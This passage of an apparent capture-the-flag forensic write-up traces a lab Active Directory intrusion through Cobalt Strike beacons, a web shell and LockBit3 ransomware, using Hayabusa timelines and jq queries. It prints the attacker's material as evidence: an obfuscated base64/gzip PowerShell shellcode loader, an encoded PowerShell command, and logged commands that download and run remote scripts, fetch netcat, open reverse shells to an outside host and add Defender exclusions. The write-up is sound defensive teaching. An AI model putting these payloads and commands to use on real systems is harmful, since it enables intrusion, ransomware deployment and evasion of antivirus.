$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

The last decoded command carry a base64 data then decode them and decompress them in memory, its a common to obfuscate the payload and bypass security mechanisms. I will use cyberchef to follow this payload :

![](/assets/images/posts/2024-08-01-icmtcFinals/04.png)


The purpose of this powershell code is to execute shellcode in memory, it perform xor operation on the decoded data and at the end it execute it. I will do the same to see if there any strings that could be helpful

![](/assets/images/posts/2024-08-01-icmtcFinals/05.png)

So this the IP of the c2 server and the useragent that is used by the beacon. For the framework used for communication, we had a couple of alerts "CobaltStrike Named Pipe" for the compromised user sql_svc

```bash
$ jq '.|select(.RuleTitle=="CobaltStrike Named Pipe")' srv02timeline.json | less -S
{
  "Timestamp": "2024-07-24 14:43:09.187 +03:00",
  "Computer": "castelblack.north.sevenkingdoms.local",
  "Channel": "Sysmon",
  "Details": {
    "Pipe": "\\MSSE-7175-server",
    "Proc": "C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchosts.exe",
    "PID": 5200,
  
}
```

And for the port I will just check the pcap files for connection made from "srv02" to the c2 server

![](/assets/images/posts/2024-08-01-icmtcFinals/06.png)

`Q1:EGCERT{172.16.1.109,8443,CobaltStrike,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2)}`


Then I kept looking for more suspicious alerts, an interesting one is "Suspicious Process By Web Server Process" so I will filter for it and will focus on the executed commands (also I will delete some of the commands from the output manually to keep our eyes on specific commands):

```bash
$ jq '.|select(.RuleTitle=="Suspicious Process By Web Server Process")|.Details.Cmdline' srv02_0724timeline.json | uniq | less -S
"cmd /cwhoami"
"cmd /ccd/var/www/html;wgethttps://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
"cmd /cpowershell"
"cmd /ciex(new-objectnet.webclient).downloadstring('http://172.16.10.110:8080/mokey')"
"cmd /cpowershelliex(new-objectnet.webclient).downloadstring('http://172.16.10.110:7070/mokey')"
"cmd /cpinghttp://172.16.10.22:7070"
"cmd /ccurl-Ohttp://172.16.10.22:7070/mokey"
"cmd /cpowershelliex(new-objectnet.webclient).downloadstring('http://172.16.10.110:7070/mokey')"
"cmd /cpowershell iwr http://172.16.10.110:7070/mokey -OutFile C:\\Windows\\Temp\\mokey"
"cmd /cpowershell iwr https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -OutFile C:\\Windows\\Temp\\netcat.zip"
"cmd /cunzip C:\\Windows\\Temp\\netcat.zip"
"cmd /cpowershell iwr https://github.com/int0x33/nc.exe/blob/master/nc64.exe -OutFile C:\\Windows\\Temp\\nc.exe"
"cmd /cnc.exe -e /bin/bash 172.16.10.110 4444"
"cmd /cnc.exe 172.16.10.110 4444 -e /bin/bash"
"cmd /cC:\\windows\\temp\\nc.exe 172.16.10.110 4444 -e /bin/bash"
"cmd /cpowershell iwr https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -OutFile C:\\Windows\\Temp\\netcat.exe"
"cmd /cdir C:\\Windows\\Temp\\netcat.exe"
"cmd /cC:\\windows\\temp\\netcat.exe 172.16.10.110 4444 -e /bin/bash"
"cmd /cping 172.16.10.110"
"cmd /cC:\\windows\\temp\\netcat.exe 172.16.10.110 4444 -e cmd.exr"
"cmd /cC:\\windows\\temp\\netcat.exe 172.16.10.110 4444"
"cmd /cdir"
```

Going quickly through the commands we see that the attacker downloaded a `netcat` and opened a reverse shell for the attacker on socket "172.16.10.110:4444" , also he downloaded a file called "mokey" (don't know what is this file yet). From Q4 we knew that the URL of the c2 beacon contains this IP "172.16.10.109" and now we see him using "172.16.10.110". we won't see another IPs for him and this is the answer for Q10 `Q10:EGCERT{172.16.10.109,172.16.10.110}`

The previous commands were executed by user "IIS APPPOOL\DefaultAppPool" which is the webserver, and its different from sql_svc user. The questions mentioned that there were a webshell uploaded to the server and it asks about its name, I searched the logs for events related to the webserver but couldn't find anything related to the shell name. I tried to search for the word "shell" in the pcap file and found a hit.

![](/assets/images/posts/2024-08-01-icmtcFinals/07.png)

The timestamp of this dns query is around 3 minutes before the command execution on the web server, so may be we are on the right track and this is the name of the shell. `Q14:EGCERT{webshell.asp}`

Q15 asks about the first command executed in powershell by the web server, we already listed the executed command so I will just grep the timestamp from "srv02timeline.json" `Q15:EGCERT{iex(new-objectnet.webclient).downloadstring('http://172.16.10.110:8080/mokey'),2024-07-24 14:07:27}`

For know we saw the attacker downloaded "mokey" and "anana.exe" and saved the later as "svchosts.exe", I will trace them on CASTELBLACK machine and see what are they doing. I found an alert related to "smbexec.py" which is part of the Impacket suite and allows users to execute commands on a remote Windows system via the SMB, I will focus and filter for the executed commands only:

```bash
$ jq '.|select(.RuleTitle=="smbexec.py Service Installation")|.Details.Path' srv02_0724timeline.json | less -S
"%COMSPEC% /Q /c echo cd
"%COMSPEC% /Q /c echo whoami
"%COMSPEC% /Q /c echo powershell
"%COMSPEC% /Q /c echo move C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchosts.exe C:\\Windows\\
"%COMSPEC% /Q /c echo mkdir C:\\Windows\\System3S
"%COMSPEC% /Q /c echo move C:\\Windows\\svchosts.exe C:\\Windows\\System3S\\svchost.exe
"%COMSPEC% /Q /c echo powershell Start-Process -FilePath C:\\Windows\\System3S\\svchost.exe
"%COMSPEC% /Q /c echo dir C:\\Windows\\System3S\\
"%COMSPEC% /Q /c echo powershell Add-MpPreference -ExclusionPath 'C:\\Windows\\System3S'
"%COMSPEC% /Q /c echo powershell iwr http://172.16.10.109:8000/anana.exe -OutFile C:\\Windows\\System3S\\svchost.exe
"%COMSPEC% /Q /c echo dir C:\\Windows\\System3S\\
"%COMSPEC% /Q /c echo powershell Start-Process -FilePath C:\\Windows\\System3S\\svchost.exe
```

The attacker was trying to move the pervious downloaded "svchosts.exe" file to a new created path "C:\Windows\System3S" and start this exe, but he needed to make an exception first in order to start the process.
Another interesting alert that I checked is "File Created (Sysmon Alert)" , I found a many txt files that match the name of the ransomware note that we saw earlier at the start of the challenge, and before the creation of the ransomware note an exe with the name "LB3.exe" was created and the process that created it is the malicious "svchost.exe"

```bash
$ jq '.|select(.RuleTitle=="File Created (Sysmon Alert)")' srv02_0724timeline.json | less -S
{
  "Timestamp": "2024-07-24 19:57:49.218 +03:00",
  "Computer": "castelblack.north.sevenkingdoms.local",
  "Channel": "Sysmon",
  "Details": {
    "Path": "C:\\Users\\sql_svc\\AppData\\Local\\Temp\\LB3.exe",
    "Proc": "C:\\Windows\\System3S\\svchost.exe",
  }
}
{
  "Timestamp": "2024-07-24 20:00:40.056 +03:00",
  "Computer": "castelblack.north.sevenkingdoms.local",
  "Channel": "Sysmon",
  "Details": {
    "Path": "C:\\Users\\vagrant.NORTH\\Downloads\\IkGcNOJsG.README.txt",
    "Proc": "C:\\Users\\sql_svc\\AppData\\Local\\Temp\\LB3.exe",
  }
}
```
From this we confirm that svchost.exe is a dropper for LockBit3 . Now I will try to answer Q11 (names of the files downloaded by the C2) Q16 (machines affected by the ransomware) and Q17 (ransomware name/Threat Name by Windows Defender ). To see which machines was affected by the ransomware I will just search by the ransomware note in each machine logs, in the directory where the .json timeline of logs exist I will run this

```bash
$ grep -l "IkGcNOJsG.README.txt" *
dc02_0724timeline.json
srv02_0724timeline.json
srv03_0724timeline.json
```
`Q16:EGCERT{BRAAVOS,CASTELBLACK,WINTERFELL}`

I kept checking some alerts on WINTERFELL , CASTELBLACK and BRAAVOS since they were hit by the ransomware. One of the alerts was "Antivirus Ransomware Detection" so I checked it:

```bash
$ jq '.|select(.RuleTitle=="Antivirus Ransomware Detection")' srv03_0724timeline.json | less -S
{
  "Timestamp": "2024-07-24 19:47:46.139 +03:00",
  "Computer": "braavos.essos.local",
  "Channel": "Defender",
  "Details": {
    "Threat": "Ransom:Win32/Lockbit.HA!MTB",
    "Severity": "Severe",
    "Type": "Potentially Unwanted Software",
    "User": "NT AUTHORITY\\SYSTEM",
    "Path": "file:_C:\\Windows\\System32\\LB3.exe",
    "Proc": "C:\\Windows\\Temp\\ChromeUpdate.exe"
  }
}
```

The file being detected is the "LB3.exe" which is the Lockbit3 exe file and it being detected as "Ransom:Win32/Lockbit.HA!MTB". `Q17:EGCERT{LB3.exe,Ransom:Win32/Lockbit.HA!MTB}`

But more importantly is the process responsible for the pervious alert "C:\Windows\Temp\ChromeUpdate.exe" where did come from? I will just grep it from the timeline file

```bash
$ grep "ChromeUpdate.exe" srv03_0724timeline.json | head -n 1
        "HostApplication": "powershell iwr http://172.16.10.100:8000/anana.exe -OutFile C:\\Windows\\Temp\\ChromeUpdate.exe"
```

So it is the same as the malicious "svchost.exe", I will try to check if there is more files downloaded the same way. I will check the alert "File Created (Sysmon Alert)" on the rest of the machines and found this entry:

```bash
$ jq '.|select(.RuleTitle=="File Created (Sysmon Alert)")' dcv02_0724timeline.json | less -S
{
  "Timestamp": "2024-07-24 17:20:00.364 +03:00",
  "RuleTitle": "File Created (Sysmon Alert)",
  "Level": "med",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "Channel": "Sysmon",
  "Details": {
    "Rule": "EXE",
    "Path": "C:\\Users\\robb.stark\\AppData\\Local\\Temp\\WindowsUpdate.exe",
    "Proc": "C:\\Windows\\system32\\wsmprovhost.exe",
    "PID": 188,
  }
}
```
And followed by this alert

```bash
{
  "Timestamp": "2024-07-24 17:20:41.310 +03:00",
  "RuleTitle": "CobaltStrike Named Pipe",
  "Level": "crit",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "Channel": "Sysmon",
  "Details": {
    "Pipe": "\\MSSE-851-server",
    "Proc": "C:\\Users\\robb.stark\\AppData\\Local\\Temp\\WindowsUpdate.exe",
    "PID": 7080,
  }
}
```
This confirm the that "WindowsUpdate.exe" is indeed malicious. `Q11:EGCERT{ChromeUpdate.exe,svchost.exe,WindowsUpdate.exe}`

Next we are asked about the name of the first malicious service installed on the machine that triggered the alert, but which machine triggered the alert at the start of the challenge? Since we have a screenshot of the windows defender alert then I will check Windows defender logs for that. I started with "castelblack" machine, it's indeed detected a malicious file but it is not the one that triggered the alert we are talking about. Next I checked "dc02" the "winterfell" machine and it has the alert we are looking for

```bash
$ cat ./triage_dc02/C/ProgramData/Microsoft/Windows\ Defender/Support/MPDetection*
2024-07-15T16:08:34.750Z Service started - Windows Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24)
2024-07-15T16:09:00.875Z Version: Product 4.18.1807.18075 Service 4.18.1807.18075 Engine 1.1.24060.5 AS 1.415.110.0 AV 1.415.110.0
2024-07-17T16:41:09.403Z Version: Product 4.18.1807.18075 Service 4.18.1807.18075 Engine 1.1.24060.5 AS 1.415.147.0 AV 1.415.147.0
2024-07-24T09:54:16.460Z Version: Product 4.18.1807.18075 Service 4.18.1807.18075 Engine 1.1.24060.5 AS 1.415.295.0 AV 1.415.295.0
2024-07-24T14:07:54.896Z DETECTION Trojan:Win32/PShellCob.SA CmdLine:C:\Windows\System32\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA2ADEAVwBiAFgAUABhAE8AQgBEACsASABIADYARgBQAG0AVABHADkAaABRAG8AQwBXAGsAYQBlAHQATwBaADgAbwA0ADUASQBEAFEAbQBDAFMAMQBsAEcAQwBIAEwAeABFAFIAWQBJAE0AawBHAHAAKwAxAC8AdgA1AFcATgBLAGIAMABtAGQANQAyADUAeQB3AHcAVABXAGQAcABkADcAVAA3ADcANwBLADQAYwBxAGcAcQBPAEUAagA1AFIAZgBlADUAUwBWAEwAaQBqAFEAdgBvADgAUQBPAGUANQAzAEcAbQBEADIAdwBxADkAUgB4ACsATQBuAEIAYwBHAFIATwBsAHQAdgBaAGcAdABxAEoAcQB0AEIAUwBjAHoANwBMAHEAQwBTAG8AbQArADUAawA2AEcAVwBPAEEAVgBNAGsAOABqAEwARwBZAHIANwBvAGEATQA1AGwASAB5AG8AUQBXAHAARwB3AHAAcQBuAFoAegBrAFQAcABLAHQATQBKAEQAWQBvADcATQBBAEsAegArAGkAcwB4AFYAVgBEADkAeQBWAGMASgBFADUAcQBhADcAWABEAGIANwBDAGYAagBCADkAOQA2ADQAZQBDAGsARQBEAGwAWAA0AFgAMgAxAFIAVgBwAGEAUwByAE8AZgBPAHAATgBDADMAMABEAGQAMAAvAFUARQBFAEwAMQAvAE0AbABKAFEAcAA5AFIAYQBlAHoAWQBwAHYAeABPAFcAWgA3AHMAYgBpAE8AeQBRAE0ARQBWAEEAMQBjAGYAZABiAGoAQgBPAHMASQBpAHMANgBhACsAYwBvADAAdgBuAHcAeAByAEUAbgBoAGIARgBwAHMAYgBrAEwATQBwAEcAawA0AHMAVgBSADAAVgBYAFEAWgBNAHkAegAwADMAZABJAFgAagB1AEkAMQBOAFkAMgArAFQAdwBTAFgAMwBGAFAARgBlAHoAOABvAG4AeABkAHYARQArADgASABpAGYAUAA5ADEASABmAEQAMgBrAGUAMgBXAEcATwBJADQAKwBVAGcAdABkAFYAVQB4AHoAUgBnAE8AUQBSAHMAcQBpAG0ARwBSAGgANQBOADkASAAyAFQANgBSAFIAOQBPAEgAaAB6AEUAdwBiAEsAWAA5AEcAaQBIAFMAZwBxACsATgBxAGgASQB2AEkASgBsAGMAVQBPAEQAbAB4AEcAYgA2AGcASABhAG8AYQBFADkAQQBVAEwAdwB3AEkAbgBCAEYAVwBoAEMARgBEAG0AQwArAGgARgAvAEoARwBhAHAAMABIAEkAVwBCADcAcwBUAG4ANwBYADcAdABRAGMAMABHADAARwA3AHUAOABxAG0AYwBkAEsASQBEAFYAVQB3AHMAcgB2AE8AZgBFADcAYwBQAFEAVAAzAHEAVABtAEkASgB4AGYAdgBEADgAaQBsAHcAVgAvAHYAeABEAE0AeQBuADMAUABQAFUATgBWAGwAegBLADYAdwBJAHIATwBGAE8AQgA3AHgATgBYAGMAeQBjAGsAawBXAFYASwBJAHgAeAB4AHkANgBTAGQANgA3ADEARQBwAGoALwByAGcAQgBGAFoAYwB4AEQAcQBkAEkAeABGAFMAYQAvAG8AagBQACsAbQAxAG0AYQBiAE0AdgAyAGoAbwBMAE4AUABhADYANgBUAHAAUwBmADEANABqAHkAWgAzADMASABlAG4AdQBSAE0AcgB0ADIAZQBQADMAcAAvAE4AUQA1ACsANQBWAE8AagB6AGwANgB1AGgAUQBUADAALwBvAEkAMAA0AHcAQwB1AGYAWgBJAFEAMwBuADgAcwBaADkAUgBoAE4AOABDAGgAbQBZAGcAUAB3ADAAegBUADIAQgA5AFIAdAA3AE4ARQB4AE4ASwBDAFQAWAA5AFcAYQBLADEAOABkAGQARwB1AHAAYwAxAFUAQwBlAFoAZgBnAEYAVgBEAEMAKwB0AG0AWgBOAEkAZQBtAFkAUQBkADkAdQBnAEwAOAAwAG0AKwBnADYAYQBrAEgAWgBVAFkAegA2AFgAMQBwAHgAZABuAHQAKwBsAHQAegB1AGMANgB3AGwASABrADAARABLAEgATwBTAFIANAA1AEYARABQAHEANQBsAEUAMQBrAFAANwArAHEAQgBvAHEAbgBpAHkATgBIACsANwAyAFEANgBaADgAZwBxAFgASwB6AEUAMgB0AFoAeQBEAGQAWAAxADMAbgBBAFYAUgBNAFMAQwBDADcAQQBNAFAASQBXAFYAUABpAFkANgBaAFIAeQBhAE8ATwA3ADkASgBhADcAUABpAEwAegBBAFgAagBXAFUAegBxAG0ARABFAG8ATwBiAEEAVQBRAFUANQBnAFIAMgBQAGgASwBNADAAWgA0AGUAYgAvAHoAZwArAHIANgBGAEIAbAByADkAYQBNAHIAawBBADYANgBVAEkAdABoAGgAZgBRAGMALwBZAFYAbABkAEEATgBMADYAaAByAC8ASQBQAGIAVwBaADIAawBSAGEARwB4AHkAawBBADYAYwBoAG8ASQA0AEQAQwB1ADgAdQBqAE8ARgB3AHIANgBtAHAASAAvAGgAWABqAC8AegBiADIAZgBXADgAeABQAGIAdABZAEYAMwBTAGYAUwBUAEEAcAB4AFUAbwB1AFYATABwAGQARQBrAHUAagBoADgAdgA2AEEAWgBZAEsAYwBVAEkAQgBhAFMALwBCAFYARABVAHQANgBlAGUARQBrAGIAYwB3ADAAeQBsAGYAaAB4AG8ANwA3AHkANAArAFgAbwB0ADIATQBXAHAAMQBOAHAAegBtAEMAWAB3AFMALwA4AHEAYgBWADcAUABXADYATgArAHYAYQBUAFkAOAAwAHcAKwB0AGgAcAA5AFQAMQA3AEkAOQBYAGoAWQB0AHcARwA5AHIAaABxAEYAWQBxAHQAMABvAGcAOQA3AFIAcABOAHoAMAA3AHUAdQBhAGYAegBzAEwAVgB4AFoAbQA3AHQAcQBNAEIANwBNAG0AMwBtADQANQBzADIARgBHAGoAMgBqAG4AZgA4AE4AYgBsAHcAcQAvAHMANwBhAFQANgBIACsAZgBiAHMALwBuAFkAYgByADIAZAB0ADEAcwBYAG4AVAB2AFoAMAB2AEkAZABPADYAcQAxAE4AdgBVAEsAaAAvAFYAcgBPADYAcgB6AEwAdQBoAGQAWABhADYARAAyAHQAYQA5AG8ATQAzAHUASgBSADMAMwB5AEwAYQBzAHIAaQBoAGUANwBPAEkALwA3ADEANAAxAHcAMABIADMAVQAwAGsAdQArAHgAQwBEAFUAMwBrAGkAMwBmAHEAZwBhADUAZgBVADIANABkAHkAbwAxADAAZQBmAG4ANgBLAHUAVgB6AGEAOABlAEIATgBNADEAegBIADUARgBFAHUASAAyAE8AeQBkAE8ATAByAFUAVABjAEcAdQBjAGQASAA1AGoAaQAxAG4AWABQACsAZQBmAFIANgA2AEoARgBLAGMATQAwAEgAVwA3AGQAcgBsADEAdQA5AGUAbQBsAEgAdAArADcAVAArAFQAbwBjAGoARQBlADMAagAwAHYASABBAGYAbABMADAAZQBMAFgAdAA4AEYARwB0AGgAYwBYAFQAcwBqAEgAVwB4AEwAQgAvAHAAbgBqAHUARABzAFgAQQBvAHYARwA4AGEAZgB5AEUASABOADMAUwA1ADYAUwAvAGIAagBmAGcATAB1AFAAegB3AEEAZgBVAHQANgAwAHIAegBvAFEAVgAxAEMATABlADIATABqAEUAOABDAGMAZABQAHAAeAA3AHkARQBlAE8AbwBsAE4AdAB4AGsAdAB6ADcAMgAzAEgAdgBoAGYAYwBsADcAZABuADYAMAA3AEgAVgBMAFoAZwBQAHoAbABRADEAUwBMAEoAYgA1AGcANQBOAEcAcABYAE4AOAB2AHgAbQBOAFMAVQBiAHQATwA3AFcAbgBZAEkANABNAG4AVQB1ADUAVQBYAGoAZgBHAGwAWgBIAEQAQgBtADMAdgByAEQAYgArAHkATgB6ADcAMgA4ADYAdQAzAHYATAA3AG4AMQAvAGYAaABvADUAbQBsAE0AYwBGAHoASQBpAGQANwByAHQALwBJAFAAaABmAFkAQQBvAGQATwBBAE4ATQBBAFIATABxAC8AVgBlAHYATABOADIANwBEAHkAZQBUADAAOQAwADAAbQA3AFcASAA3ADgASgA4AEIAOQBiAEsAYgB6AFQALwBrAHAATQBJAEgANwBIAHUAcABRAEgAVwB4ADAASQArAFkAQQBaAHMAaABDAEcAVQB0AFoAQQBXAEYANgAzADkASwBCAGwAeQBYADIAdQBZADUAdgBPAHYAbgAwAGMAcQBBAHMAcgBnAFoAUQBCAHYAaAA2AHoAdwBxAG8AeAB4AG8AbwBmAGYAQwAxAE0ASQBSAG4ARQA2AEkASwBmAFEAWQBHADUAaABXAFQANQAvAGQAbQBXAGgAZwB5AEIATQB2AEQAUwBtAGUAZQBoADUAeQBZAEQAWQBSADUAagBOAHkAVQB6AHcAMwBiAHYAUABFAEYANwArAEMATQBRAGUARABSAGIAcQBJAFkAOQBLAHUAMwBLAHAAVgBOAEwALwBMADAAcABXADcAdgBkAGgAcQBmAE4AMQBiAEIANwBNADUAZgBXAEEAUABQAEwAawArAEMAYQBXADMARwBUAHQAMABSAGQAaABzAEsATAAvAFkAdwBKACsAdQB2AFQAZgBvAGQAWABnAEoAVABQADIAQQBGADMAaQAwAFAATgA0AFcAVABuAGoAUQB5ADUAbgBlACsAaABvAFgALwBwAFAAOABJAEsAawBHADMAUwBWAGMARQA4AHEATABGAFIAaAB5AGUAZgB3ADMARQB6ADYAcAAzAG0ASwBMAFcAUQAzAHgAKwBnAFUAbwArACsAbwBBAE8ARgBWAFoAZgBrAGMAMwBwAHgAaQBFAGUAcABtAGkAdABJAG4AOQBEAGUAMAB4AFgANgBxACsAQQAzAGQAVQBFAEwAaABDAFYAVABvADgAagBtAHcAbABNAEoATQAxAEsAWQBUAEkAMQBvAFkAOQB2ADQAQwBPAG4ANgBIAFoAcABNAEwAQQBBAEEAPQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==
2024-07-24T14:07:54.974Z DETECTION Behavior:Win32/ScrpService.B behavior:process: C:\Windows\System32\services.exe, pid:568:784724548234423
2024-07-24T14:07:54.974Z DETECTION Behavior:Win32/ScrpService.B regkeyvalue:HKLM\SYSTEM\ControlSet001\Services\a45282b\\ImagePath
```
From the last line we can get the service name. `Q6:EGCERT{a45282b}`

Now moving to which user account did the attacker compromised first, since it is an Active directory environment it is good to do a quick search about account compromising techniques. At first we need to spot which account was compromised, then we need to figure how it was compromised in order to get the timestamp of this action. My guess is the attacker logged in with this account after he compromised it, so we need to now the first time he made a successful logon:

```bash
$ jq '.|select(.RuleTitle=="Logon (Network)")|select(.Details.SrcIP=="172.16.10.109")|select(.Details.TgtUser!="ANONYMOUS LOGON")' dc02_0724timeline.json | less -S
{
  "Timestamp": "2024-07-24 12:42:31.556 +03:00",
  "RuleTitle": "Logon (Network)",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "Channel": "Sec",
  "EventID": 4624,
  "Details": {
    "Type": "3 - NETWORK",
    "TgtUser": "brandon.stark",
    "SrcComp": "-",
    "SrcIP": "172.16.10.109",
  },
}
```
Next I tried to get how the attacker compromised this account but found nothing, my mistake was that I was so focused on events of "2024–07–24" and nothing else, but in order to continue solving we need to get back and figure what happened. I will focus on events of "dc02" machine since its the DC and its logs may carry events related to compromising the account, also the it is in the same domain we are working with so far:

```bash
$ ~/tools/hayabusa-2.14.0-win-x64.exe json-timeline -d ./triage_dc02/C/Windows/System32/winevt/logs/ -o dc02alltimeline.json
```
Now applying this query to see when did the attacker logged in:

```bash
$ jq '.|select(.RuleTitle=="Logon (Network)")|select(.Details.SrcIP=="172.16.10.109")|select(.Details.TgtUser!="ANONYMOUS LOGON")|{Timestamp,user:.Details.TgtUser}' dc02alltimeline.json | awk '!/\{/' | awk '!/\}/'| less -S
  "Timestamp": "2024-07-19 15:02:27.378 +03:00",
  "user": "hodor"
  "Timestamp": "2024-07-19 15:02:41.372 +03:00",
  "user": "hodor"
  "Timestamp": "2024-07-19 15:02:41.629 +03:00",
  "user": "vagrant"
  "Timestamp": "2024-07-19 15:02:57.371 +03:00",
  "user": "samwell.tarly"
  "Timestamp": "2024-07-19 15:02:57.492 +03:00",
  "user": "samwell.tarly"
  "Timestamp": "2024-07-19 15:02:57.523 +03:00",
  "user": "samwell.tarly"
  "Timestamp": "2024-07-19 15:03:13.240 +03:00",
  "user": "brandon.stark"
  "Timestamp": "2024-07-19 15:03:56.980 +03:00",
  "user": "brandon.stark"
  "Timestamp": "2024-07-19 15:05:12.042 +03:00",
  "user": "brandon.stark"
  "Timestamp": "2024-07-19 15:06:00.578 +03:00",
  "user": "brandon.stark"
  "Timestamp": "2024-07-19 15:06:46.131 +03:00",
  "user": "brandon.stark"
  "Timestamp": "2024-07-19 15:07:41.330 +03:00",
  "user": "jon.snow"
```
He made a couple of logons with different accounts and all of them are compromised, but which one was the first? I searched for a trace of "AS-REProasting" (The technique that was used for compromising one of the accounts, a good article about it and its detection is here) , the detection for that is looking for an event where a TGT is requested and the encryption type is 0x17 (it indicate a weak encryption is used RC4 and the attacker may request a ticket in this encryption type because it allows them to crack the password.) and the Preauthentication is 0 (no authentication is required for the request TGT) :

```bash
